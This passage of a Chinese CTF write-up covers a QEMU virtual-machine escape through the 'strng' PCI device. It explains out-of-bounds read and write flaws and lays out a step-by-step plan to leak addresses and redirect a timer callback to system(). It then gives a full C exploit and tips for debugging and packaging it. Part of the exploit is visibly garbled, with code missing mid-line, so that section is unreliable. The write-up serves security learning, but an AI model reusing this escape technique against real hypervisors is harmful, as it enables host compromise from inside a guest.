            {
              *((_DWORD *)&opaque->pdev.qdev.parent_obj.free + saddr + 0x2BCLL) = val;
              if ( opaque->flag )
              {
                v4 = qemu_clock_get_ms_4(QEMU_CLOCK_VIRTUAL_0);
                timer_mod(&opaque->strng_timer, v4 + 100); // 启动定时器
              }
            }
          }
        }
        else
        {
          opaque->addr = val;
        }
      }
    }
    00000000 STRNGState      struc ; (sizeof=0xC30, align=0x10, copyof_1437)
    00000000 pdev            PCIDevice_0 ?
    000008F0 mmio            MemoryRegion_0 ?
    000009F0 pmio            MemoryRegion_0 ?
    00000AF0 addr            dd ?
    00000AF4 flag            dd ?
    00000AF8 regs            dd 64 dup(?)
    00000BF8 strng_timer     QEMUTimer_0 ?
    00000C28                 db ? ; undefined
    00000C29                 db ? ; undefined
    00000C2A                 db ? ; undefined
    00000C2B                 db ? ; undefined
    00000C2C                 db ? ; undefined
    00000C2D                 db ? ; undefined
    00000C2E                 db ? ; undefined
    00000C2F                 db ? ; undefined
    00000C30 STRNGState      ends
    00000000 QEMUTimer_0     struc ; (sizeof=0x30, align=0x8, copyof_506)
    00000000                                         ; XREF: IscsiTask/r
    00000000                                         ; STRNGState/r
    00000000 expire_time     dq ?
    00000008 timer_list      dq ?                    ; offset
    00000010 cb              dq ?                    ; offset
    00000018 opaque          dq ?                    ; offset
    00000020 next            dq ?                    ; offset
    00000028 scale           dd ?
    0000002C                 db ? ; undefined
    0000002D                 db ? ; undefined
    0000002E                 db ? ; undefined
    0000002F                 db ? ; undefined
    00000030 QEMUTimer_0     ends
上图可以明显看到一个mmio_read中有越界读漏洞, mmio_write中有越界写漏洞. 结合 `STRNGState` 这个结构体的内容可以看到
regs 后面接的是 一个 `QEMUTimer_0` 结构体. 这个结构体是一个定时器. 其中 cb 是函数指针(callback function),
而 opaque 就是传给 callback function 的参数.
而在 pmio_write 函数中可以启动定时器.
所以利用思路就很简单了.
  1. 因为 `QEMUTimer_0` 的cb 初始化时是指向 elf中的一个函数的, 所以我们可以利用越界读把这个地址读出来, 从而拿到 elf 的基地址, 绕过 PIE.
  2. 利用 `QEMUTimer_0` 的 opaque leak 堆地址
  3. 往 regs[3]-regs[6] 中写入字符串 “cat /root/flag”
  4. 利用pwndbg 的probeleak命令在 堆上找到一个指向libc 的地址, leak libc地址
  5. 把 cb 修改为 system 地址
  6. 把 opaque 修改为 “cat /root/flag”的地址
  7. 启动定时器.
(其实不leak libc地址也可以, 有了 elf 基地址之后可以用 system[@plt](https://github.com/plt
"@plt") 的地址)
## 3\. exploit
    //cc -m32 -O0 -static -o exp exp.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include
    #define MMIO_FILE "/sys/devices/pci0000:00/0000:00:04.0/resource0"
    #define PMIO_BASE 0xc050
    char* MMIO_BASE;
    void die(char* msg){
        perror(msg);
        exit(-1);
    }
    void init_io(){
        int mmio_fd = open(MMIO_FILE, O_RDWR | O_SYNC);
        if (mmio_fd == -1)
            die("open mmio file error");
        MMIO_BASE = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
        if (MMIO_BASE == MAP_FAILED)
            die("mmap mmio file failed");
        if (iopl(3) != 0)
            die("io permission requeset failed");
    }
    uint32_t pmio_read(uint32_t offset){
        return (uint32_t)inl(PMIO_BASE + offset);
    }
    void pmio_write(uint32_t offset, uint32_t val){
        outl(val, PMIO_BASE + offset);
    }
    uint32_t mmio_read(uint32_t offset){
        return *(uint32_t *)(MMIO_BASE + offset);
    }
    void mmio_write(uint32_t offset, uint32_t val){
        *(uint32_t *)(MMIO_BASE + offset) = val;
    }
    uint32_t pmio_oob_read(uint32_t offset) {
        pmio_write(0, offset);
        return pmio_read(4);
    }
    void pmio_oob_write(uint32_t offset, uint32_t val){
        pmio_write(0, offset);
        pmio_write(4, val);
    }
    /*
    cat /root/flag 
    0x20746163
    0x6f6f722f
    0x6c662f74
    0x00006761
    */
    int main(int argc, char **argv){
        uint64_t elf_base, state_addr, libc_base, system_addr;
        uint32_t reg_offset = 0xaf8;
        init_io();
        mmio_write(0x10, 0x20746163);
        mmio_write(0x14, 0x6f6f722f);
        mmio_write(0x18, 0x6c662f74);
        mmio_write(0x1c, 0x00006761);
        elf_base = pmio_oob_read(0xc0c-reg_offset);
        elf_base >32));
        pmio_oob_write(0xc08-reg_offset, (uint32_t)(system_addr&0xffffffff));
        // overwrite function's argument
        pmio_oob_write(0xc14-reg_offset, (uint32_t)((state_addr+0xb08) >> 32));
        pmio_oob_write(0xc10-reg_offset, (uint32_t)((state_addr+0xb08) & (0xffffffff)));
        // trigger timer -> call-back function
        mmio_write(0x20, 0);
        pmio_oob_write(0, 0);
        sleep(1);
        return 0;
    }
## 4\. 一些小技巧
###  4.1. 交互
**4.1.1. MMIO**
这题中我们通过 cat resource 文件已经可以确定物理地址 `febf1000-febf10ff` 是属于这个设备的.
要访问这块物理地址我们有两种方式:
  1. mmap /sys/devices/pci0000:00/0000:00:04.0/resource0 这个文件之后然后读写[3]
  2. mmap /dev/mem 通过/dev/mem 可以访问整个物理内存. (mam mem for more information)
这两种方式我都集成在了我的模板之中. 有些题目只能用第二种方法. 具体情况具体分析
**4.1.2. PMIO**
直接用 inx 和 outx 函数即可. 要注意的是需要先调用 `iopl(3)` 来提升io 权限, 否则可能会读写失败.
###  4.2. 调试
    ➜  strng2 cat ./debug 
    file qemu-system-x86_64
    b strng_mmio_read
    b strng_mmio_write
    b strng_pmio_read
    b strng_pmio_write
    set $state=0x555556a64db0
    set $addr=$state+0xaf0
    set $regs=$state+0xaf8
    set $timer=$state+0xbf8
    run -initrd ./rootfs.cpio -kernel ./vmlinuz-4.8.0-52-generic -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -L ./dependency/usr/local/share/qemu -L pc-bios -device strng
    ➜  strng2 sudo gdb --command=./debug
###  4.3. 传输exp
我是用Makefile的, 编译打包一条命令就可以了
    ➜  rootfs cat Makefile 
    exp:
            cc -m32 -O0 -static -o exp exp.c
            find . | cpio -H newc -ov -F ../rootfs.cpio
            rm exp
###  4.4. exp template
做了几个题目我也总结了一个 qemu pwn 的exp模板, 封装了一些简单的函数, 仅供参考(会持续更新)
## 4\. 总结
总的来说这题比较简单, 适合用来入门. 因为这个题目既学到了很多知识, 同时也发现了更多要学的东西2333.
## 参考
[1] [ray-cp师傅的vm-escape 库](https://github.com/ray-cp/vm-escape)
[2] [sysfs-pci.txt](https://www.kernel.org/doc/Documentation/filesystems/sysfs-pci.txt)
[3]
[pci设备开发基础知识](https://techpubs.jurassic.nl/manuals/linux/developer/REACTLINUX_PG/sgi_html/ch07.html)
[4] [qemu pwn-基础知识](https://xz.aliyun.com/t/6562)
[5]
[ioport.h](https://github.com/torvalds/linux/blob/master/include/linux/ioport.h)